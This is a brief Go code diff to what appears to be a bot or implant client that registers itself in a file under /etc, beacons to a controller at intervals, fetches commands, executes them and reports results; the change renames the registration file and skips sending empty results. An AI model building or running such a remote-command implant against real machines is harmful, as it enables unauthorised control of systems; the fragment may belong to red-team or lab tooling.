@@ -25,7 +25,7 @@ var MAGICTERMBYTE = MAGICTERM[0]
 var MAGICTERMSTR = string(MAGICTERM)
 
 //REGFILE is where the registration info for this bot is kept
-var REGFILE = "/etc/PETREG"
+var REGFILE = "/etc/MCTESTREG"
 
 //INTERVAL is how long the sleep is between callbacks (if run in loop mode)
 var INTERVAL = 60
@@ -65,5 +65,7 @@ func main() {
 	comPL := metcli.GenGetComPL(m)
 	comstr := send(comPL, m)
 	res := metcli.HandleComs(comstr, m)
-	send(res, m)
+	if len(res) > 0 {
+		send(res, m)
+	}
 }
